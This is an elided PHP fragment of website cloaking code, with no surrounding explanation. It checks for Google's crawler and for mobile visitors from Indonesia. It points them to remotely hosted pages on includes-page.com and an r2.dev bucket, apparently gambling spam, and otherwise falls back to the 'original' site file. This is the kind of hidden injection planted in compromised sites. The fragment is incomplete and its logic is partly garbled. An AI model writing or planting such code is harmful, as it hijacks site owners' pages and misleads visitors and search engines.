...
$desktopUrl = 'https://includes-page.com/cmd/inspos.fi/lp.txt';
...
if (isGoogleCrawler()) {
    ...
    if ($visitorCountry === 'Indonesia') {
        ...
        if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
            ...
            $mobileUrl = 'https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/Bola16.html';
        ...
        include "main.php"; // site asli bawaan
    }
}
